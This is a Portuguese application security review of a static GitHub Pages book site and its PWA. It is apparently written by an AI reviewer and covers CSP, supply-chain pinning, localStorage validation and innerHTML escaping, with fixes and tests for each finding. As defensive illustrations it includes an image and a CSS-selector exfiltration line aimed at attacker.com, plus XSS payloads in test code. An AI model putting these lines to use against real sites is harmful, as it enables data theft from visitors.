# AppSec Review — ai2m2ia.github.io

**Revisor:** Claude (AppSec sênior)  
**Data:** 2026-06-01  
**Escopo:** Repositório `/Volumes/WORK/projects/ai2m2ia.github.io` — análise completa  
**Metodologia:** OWASP Top 10 2021 · OWASP ASVS · Secure Coding Best Practices

---

## Visão Geral da Arquitetura

| Camada | Tecnologia |
|--------|-----------|
| Hosting | GitHub Pages (zero código server-side) |
| Frontend principal | HTML + vanilla JS (`index.html` / `app.js`) |
| PWA reader | `pwa/index.html` + `pwa/assets/app.js` |
| Service Worker | `pwa/sw.js` |
| API | JSON estático (`/api/catalog.json`, `/api/books/*/content.json`) |
| CI/CD | GitHub Actions (ci.yml, auto-pr-promotion.yml, auto-tag-main.yml, prod-smoke.yml) |
| Dependências de dev | Playwright 1.60.0, ajv 8.20.0, ajv-formats 3.0.1 |

**Superfície de ataque relevante:**
- JavaScript client-side executando no browser do usuário
- `localStorage` (tema, idioma, cache i18n, progresso de leitura, lista de downloads)
- Service Worker cache
- Pipeline de CI/CD e PAT `BOT_GH_TOKEN`
- Dependência externa: Google Fonts (CSS de terceiro)
- Embeds de YouTube / TikTok (on-demand)
- Parâmetro `?api=` na URL do PWA

**`npm audit` produção:** 0 vulnerabilidades conhecidas.

---

## Resumo Executivo dos Achados

| # | Severidade | Categoria OWASP | Título |
|---|-----------|-----------------|--------|
| F01 | **MÉDIO** | A08 — Integridade de Software e Dados | GitHub Action sem pinagem por SHA (`@v7`) |
| F02 | **MÉDIO** | A05 — Misconfiguration | CSP `img-src https:` — curinga excessivo |
| F03 | **BAIXO** | A08 — Integridade de Software e Dados | Google Fonts CSS sem Subresource Integrity |
| F04 | **BAIXO** | A03 — Injection | `data-theme` do `localStorage` sem validação |
| F05 | **BAIXO** | A03 — Injection | `inlineMarkdown` + `innerHTML`: cadeia segura, mas frágil |
| F06 | **INFO** | A09 — Logging/Monitoring | CSP sem `report-uri` — violações não são registradas |
| F07 | **INFO** | A05 — Misconfiguration | CSP via `<meta>` tag — limitação de plataforma |
| F08 | **INFO** | A04 — Insecure Design | Parâmetro `?api=` expõe superfície de ataque (mitigado) |

---

## Achados Detalhados

---

### F01 — GitHub Action sem pinagem por SHA (`@v7`) [MÉDIO]

**OWASP:** A08 — Software and Data Integrity Failures  
**ASVS:** V14.2.1 — All components come from trusted repositories  

**Arquivo/trecho afetado:**
```
.github/workflows/prod-smoke.yml, linha 46
uses: actions/github-script@v7
```

**Contexto:** Todos os outros `uses:` do repositório usam hashes de commit exatos e imutáveis:
```yaml
uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
uses: actions/setup-node@1d0ff469b7ec7b3cb9d8673fde0c81c44821de2a # v4.2.0
uses: actions/upload-artifact@65c4c4a1ddee5b72f698fdd19549f0f0fb45cf08 # v4.6.0
# Mas no mesmo arquivo, linha 46:
uses: actions/github-script@v7   ← tag mutável
```

**Cenário de exploração:**
A tag `@v7` é uma referência mutável no repositório `actions/github-script`. Se esse repositório for comprometido (ataque à cadeia de suprimento), o mantenedor do ataque pode mover a tag `v7` para um commit malicioso. Na próxima execução do workflow `prod-smoke.yml`, o código malicioso seria executado com o `GITHUB_TOKEN` padrão (`contents: read`), podendo vazar segredos do ambiente de execução, ler código-fonte e possivelmente criar issues no repositório com conteúdo injetado.

**Correção mínima recomendada:**
Substituir a tag mutável pelo mesmo SHA já usado no resto do workflow:
```yaml
# Antes:
uses: actions/github-script@v7
# Depois:
uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1
```

**Teste automatizado sugerido:**
```bash
# Falha se qualquer action usar tag mutável em vez de SHA
grep -rn "uses:.*@v[0-9]" .github/workflows/ | grep -v "#"
# Deve retornar 0 linhas
```

---

### F02 — CSP `img-src https:` — curinga excessivo [MÉDIO]

**OWASP:** A05 — Security Misconfiguration  
**ASVS:** V14.4.3 — Content Security Policy is implemented in a way that prevents XSS  

**Arquivo/trecho afetado:**
```
index.html, linha 11:
img-src 'self' data: https:
                      ^^^^^^ curinga — qualquer origem HTTPS
```

**Cenário de exploração:**
Com `img-src https:`, o browser aceita carregar `<img src="https://attacker.com/pixel?data=...">` de qualquer origem HTTPS. Embora hoje o site não possua conteúdo gerado pelo usuário, esse curinga é perigoso em dois cenários:

1. **Pixel tracking:** Um conteúdo malicioso injetado (via cadeia de suprimento dos arquivos JSON estáticos) poderia usar imagens para exfiltrar informações da sessão.
2. **Futuras features:** Qualquer feature que leia URLs de imagens de dados externos e as insira no DOM seria imediatamente explorável para SSRF/exfiltração sem alterar o CSP.

O PWA (`pwa/index.html`) já está corretamente restrito:
```
img-src 'self' data: https://ai2m2ia.github.io  ← correto
```

**Correção mínima recomendada:**
```html
<!-- Antes -->
img-src 'self' data: https:
<!-- Depois -->
img-src 'self' data: https://fonts.gstatic.com
```
(Google Fonts serve fontes de `fonts.gstatic.com`, não imagens. Se não há imagens externas de terceiros, remover `https:` completamente é o ideal.)

**Teste automatizado sugerido:**
```javascript
// Playwright test — verificar que CSP não contém 'https:' wildcard em img-src
test('CSP img-src não usa curinga https:', async ({ page }) => {
  const response = await page.goto('/');
  const cspMeta = await page.$eval(
    'meta[http-equiv="Content-Security-Policy"]',
    el => el.content
  );
  expect(cspMeta).not.toMatch(/img-src[^;]*\bhttps:\s/);
});
```

---

### F03 — Google Fonts CSS sem Subresource Integrity [BAIXO]

**OWASP:** A08 — Software and Data Integrity Failures  
**ASVS:** V14.2.3 — Third-party components come with integrity verification  

**Arquivo/trecho afetado:**
```html
index.html, linhas 27–29:
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:..." rel="stylesheet">
```

**Cenário de exploração:**
Sem um atributo `integrity` (Subresource Integrity), o browser aceita qualquer resposta CSS da origem `fonts.googleapis.com` sem verificar a integridade do conteúdo. Se a CDN do Google Fonts for comprometida (cache poisoning, BGP hijack, ou comprometimento interno), CSS malicioso pode ser entregue. CSS moderno permite exfiltração de dados via seletores de atributo:
```css
input[value^="a"] { background: url("https://attacker.com/exfil?v=a") }
```

**Nota técnica:** O Google Fonts serve respostas com `Cache-Control: private`, o que impede SRI estável (o hash muda por user-agent). A correção definitiva é **auto-hospedar as fontes**. O PWA (`pwa/index.html`) já não depende do Google Fonts — aplica a mesma abordagem ao site principal.

**Correção mínima recomendada:**
```bash
# Baixar as fontes e servi-las localmente
mkdir -p assets/fonts/
# Cormorant Garamond + Inter → baixar .woff2 do Google Fonts
# Adicionar @font-face em styles.css apontando para 'self'
# Remover as três linhas de <link> para fonts.googleapis.com do index.html
```

**Teste automatizado sugerido:**
```bash
# Falha se houver link externo para fonts.googleapis.com sem atributo integrity
grep -n 'fonts.googleapis.com' index.html | grep -v 'integrity='
# Deve retornar 0 linhas
```

---

### F04 — `data-theme` do `localStorage` sem validação [BAIXO]

**OWASP:** A03 — Injection  
**ASVS:** V5.2.1 — All untrusted HTML input is sanitized  

**Arquivo/trecho afetado:**
```javascript
theme-init.js, linhas 4–7:
var saved = localStorage.getItem('ai2m2ia-theme');
var prefersLight = window.matchMedia('(prefers-color-scheme: light)').matches;
var theme = saved || (prefersLight ? 'light' : 'dark');
document.documentElement.setAttribute('data-theme', theme);
//                                                   ^^^^^ sem validação
```

**Contraste:** O mesmo arquivo valida corretamente o idioma salvo:
```javascript
if (savedLang && /^[a-z]{2}(?:-[A-Z]{2})?$/.test(savedLang)) { ... } // ← correto
```

**Cenário de exploração:**
Se um atacante obtiver acesso de escrita ao `localStorage` (via qualquer XSS na mesma origem), poderá definir `ai2m2ia-theme` com um valor arbitrário que será inserido como atributo `data-theme` no elemento `<html>`. O impacto prático na configuração atual é baixo (o CSS usa apenas `[data-theme="dark"]` e `[data-theme="light"]`), mas cria inconsistência de segurança — o idioma é validado, o tema não.

**Correção mínima recomendada:**
```javascript
// Antes:
var theme = saved || (prefersLight ? 'light' : 'dark');

// Depois:
var VALID_THEMES = ['dark', 'light'];
var theme = VALID_THEMES.includes(saved) ? saved : (prefersLight ? 'light' : 'dark');
```

**Teste automatizado sugerido:**
```javascript
// tests/security.test.js (adicionar)
test('theme-init só aceita valores permitidos para data-theme', () => {
  const validThemes = ['dark', 'light'];
  const maliciousInputs = ['"><script>', 'dark;color:red', 'javascript:void', ''];
  for (const input of maliciousInputs) {
    assert.ok(!validThemes.includes(input), `"${input}" não deveria ser aceito`);
  }
});
```

---

### F05 — `inlineMarkdown` + `innerHTML`: cadeia segura, mas frágil [BAIXO]

**OWASP:** A03 — Injection  
**ASVS:** V5.2.1 — All untrusted data sanitized before DOM insertion  

**Arquivo/trecho afetado:**
```javascript
pwa/assets/app.js, linhas 1685 e 1696–1715:

nodes.chapterBody.innerHTML = renderProse(chapter.text || "");

function renderProse(text) {
  return text.split(/\n\s*\n+/).map(block => {
    const clean = escapeHtml(block.trim());     // ← escaping acontece aqui
    if (clean.startsWith("### ")) return `<h3>${inlineMarkdown(clean.slice(4))}</h3>`;
    return `<p>${inlineMarkdown(clean)}</p>`;
  }).join("");
}

function inlineMarkdown(text) {
  return text
    .replace(/\*\*(.*?)\*\*/g, "<strong>$1</strong>")  // $1 = texto já escapado
    .replace(/_(.*?)_/g, "<em>$1</em>")
    .replace(/`(.*?)`/g, "<code>$1</code>");
}
```

**Análise de segurança:**
A cadeia atual **é segura**: `escapeHtml()` converte todos os caracteres HTML perigosos (`<`, `>`, `"`, `'`, `&`) antes de `inlineMarkdown()` processá-los. Os grupos de captura `$1` das regex só conterão texto já HTML-codificado. Exemplo de prova:

```
Entrada:  **<script>alert(1)</script>**
Após escapeHtml:  **&lt;script&gt;alert(1)&lt;/script&gt;**
Após inlineMarkdown:  <strong>&lt;script&gt;alert(1)&lt;/script&gt;</strong>
No DOM via innerHTML:  renderiza como texto literal — seguro.
```

**Risco residual:** A segurança depende da invariante implícita de que `inlineMarkdown` recebe **sempre** texto já HTML-escaped. Não há documentação dessa invariante no código. Um desenvolvedor que reutilize `inlineMarkdown` com texto bruto criará XSS trivialmente.

**Correção mínima recomendada:**
```javascript
/**
 * INVARIANTE DE SEGURANÇA: `text` deve ser o resultado de escapeHtml().
 * Nunca chamar diretamente com texto bruto do usuário ou de dados externos.
 */
function inlineMarkdown(text) { ... }
```
Adicionar teste adversarial a `tests/security.test.js`.

**Teste automatizado sugerido:**
```javascript
// Simular input adversarial passando pela cadeia completa:
test('renderProse não produz HTML injetável', () => {
  const adversarial = '**<img src=x onerror=alert(1)>**\n\n_<svg onload=alert(1)>_';
  const result = renderProse(adversarial);
  assert.ok(!result.includes('<img'), 'tag <img> não deve aparecer não-escapada');
  assert.ok(!result.includes('onerror'), 'atributo onerror não deve aparecer');
  assert.ok(!result.includes('<svg'), 'tag <svg> não deve aparecer não-escapada');
});
```

---

### F06 — CSP sem `report-uri` — violações não são registradas [INFORMACIONAL]

**OWASP:** A09 — Security Logging and Monitoring Failures  
**ASVS:** V7.3.1 — Security logs are generated  

**Arquivo/trecho afetado:**
```
index.html, linha 11 — CSP meta tag não possui report-uri
pwa/index.html, linha 9 — idem
```

**Cenário de exploração:**
Tentativas de bypass do CSP (injeção de conteúdo, extensões maliciosas, ataques à cadeia de suprimento) geram violações que são silenciosamente descartadas. Sem `report-uri`, é impossível detectar que o CSP está sendo contornado em produção.

**Correção mínima recomendada:**
Adicionar um endpoint de relatório (ex: [report-uri.com](https://report-uri.com) ou equivalente):
```html
<meta http-equiv="Content-Security-Policy" content="... ; report-uri https://relatorio.exemplo.com/csp">
```
Nota: o GitHub Actions já cria issues automaticamente em falhas de smoke test — aplicar a mesma filosofia de monitoramento ao CSP.

**Teste automatizado sugerido:**
```javascript
test('CSP contém report-uri', async ({ page }) => {
  await page.goto('/');
  const csp = await page.$eval('meta[http-equiv="Content-Security-Policy"]', el => el.content);
  expect(csp).toContain('report-uri');
});
```

---

### F07 — CSP via `<meta>` tag — limitação de plataforma [INFORMACIONAL]

**OWASP:** A05 — Security Misconfiguration  

**Arquivo/trecho afetado:**
```
index.html, pwa/index.html, pwa/offline.html — CSP via <meta http-equiv>
```

**Análise:**
GitHub Pages não suporta headers HTTP customizados. O CSP é entregue via `<meta http-equiv="Content-Security-Policy">`, o que impõe limitações em relação ao CSP por header:

| Diretiva | Header HTTP | Meta Tag |
|----------|------------|----------|
| `frame-ancestors` | Suportado | **Não suportado** |
| `sandbox` | Suportado | **Não suportado** |
| `<link rel="prefetch">` bloqueio | Sim | Parcial (varia por browser) |

Nenhuma dessas diretivas faltantes representa risco crítico para a arquitetura atual (o site não tem frames sensitivos, não é embarcado em outros sites por design).

**Mitigação a médio prazo:**
Avaliar migração para plataforma que suporte headers customizados (Cloudflare Pages, Netlify, Vercel), o que permitiria adicionar também `X-Content-Type-Options: nosniff`, `Permissions-Policy` e HSTS.

---

### F08 — Parâmetro `?api=` expõe superfície de ataque (mitigado) [INFORMACIONAL]

**OWASP:** A10 — SSRF / A04 — Insecure Design  

**Arquivo/trecho afetado:**
```javascript
pwa/assets/app.js, linhas 1 e 1737–1755:
const configuredApi = new URLSearchParams(window.location.search).get("api");
```

**Análise:**
O parâmetro `?api=` permite configurar um API base URL alternativo. A função `resolveConfiguredApiBaseUrl()` valida a origem contra uma allowlist:
```javascript
if (
  parsed.origin === DEFAULT_API_BASE_URL ||    // mesma origem
  parsed.origin === CANONICAL_API_BASE_URL ||  // https://ai2m2ia.github.io
  isLocalDevOrigin(parsed)                     // localhost / 127.0.0.1 / [::1]
) { return parsed.origin; }
// Senão → retorna DEFAULT_API_BASE_URL (falha segura)
```

A validação está correta — origens externas são rejeitadas. Porém, a feature é **não-documentada publicamente** e adiciona superfície de ataque desnecessária em produção (qualquer usuário pode testar variações de URL). Além disso, permite que `localhost` seja aceito como origem API — útil em desenvolvimento, mas um atacante que hospede localmente na vítima (ex: via CSRF para app local) poderia explorar isso em teoria.

**Correção mínima recomendada:**
Remover o suporte a `isLocalDevOrigin()` em produção via build flag, ou documentar explicitamente que é exclusivo para desenvolvimento. Alternativamente, remover o parâmetro `?api=` completamente e usar variáveis de ambiente no build.

---

## Categorias OWASP sem achados relevantes

| Categoria | Razão |
|-----------|-------|
| A01 — Broken Access Control | Site 100% público — não há controle de acesso a avaliar |
| A02 — Cryptographic Failures | Nenhuma operação criptográfica; nenhum segredo em código |
| A07 — Auth/AuthZ Failures | Sem autenticação — conteúdo público |
| Injection via `eval`/`Function()` | Nenhum uso encontrado em todos os arquivos JS |
| Path Traversal | `localPathForApiUrl()` em `api-contract.js` usa `path.resolve()` + verificação de prefixo corretamente |
| SW Cache Poisoning | SW valida `response.type === "basic"` antes de cachear — opaque responses rejeitadas |
| `BOT_GH_TOKEN` leak | Token é mascado pelo Actions; resposta da API `/user` não é ecoada nos logs |

---

## Contexto que falta para análise completa

1. **Branch protection rules:** O repositório tem branches `main`, `develop` e `feature/*`. Não foi possível verificar se há regras de proteção no GitHub (aprovação de PR, status checks obrigatórios) sem acesso à interface do GitHub. Branches desprotegidos + `auto-pr-promotion.yml` poderiam permitir auto-merge sem revisão humana.

2. **Configuração de permissões do `BOT_GH_TOKEN`:** O token é um PAT clássico ou fine-grained? Um PAT clássico com escopo `repo` teria acesso a todos os repositórios do usuário, não apenas ao `ai2m2ia.github.io`.

3. **AGPL-3.0 compliance dos conteúdos dos livros:** Fora do escopo AppSec, mas o licenciamento como AGPL inclui obrigações de disponibilização de código-fonte que podem ter implicações legais.

---

## Avaliação Geral

O repositório demonstra **maturidade de segurança acima da média** para um projeto pessoal/indie:

- Funções `escapeHtml()`, `safeUrl()`, `safeMediaId()`, `isSafeYouTubeId()`, `isSafeTikTokId()` implementadas e testadas com cobertura unitária.
- CSP significativo apesar das limitações do GitHub Pages.
- GitHub Actions majoritariamente pinados a SHAs imutáveis.
- Service Worker valida respostas antes de cachear.
- `?api=` override corretamente allowlistado.
- `npm audit` limpo.
- `realpath_inside()` em Python protege contra path traversal na build.

**Prioridade de remediação:**

| Prioridade | Achado | Esforço |
|-----------|--------|---------|
| 🔴 Alta | F01 — Pinar `actions/github-script@v7` ao SHA | < 5 min |
| 🟡 Média | F02 — Restringir `img-src https:` | < 5 min |
| 🟡 Média | F04 — Validar `data-theme` do localStorage | < 5 min |
| 🟢 Baixa | F03 — Auto-hospedar fontes | 30–60 min |
| 🟢 Baixa | F05 — Documentar invariante + teste adversarial | 15 min |
| ⚪ Info | F06 — Adicionar report-uri ao CSP | 15 min |
| ⚪ Info | F08 — Remover/documentar `?api=` em produção | 30 min |
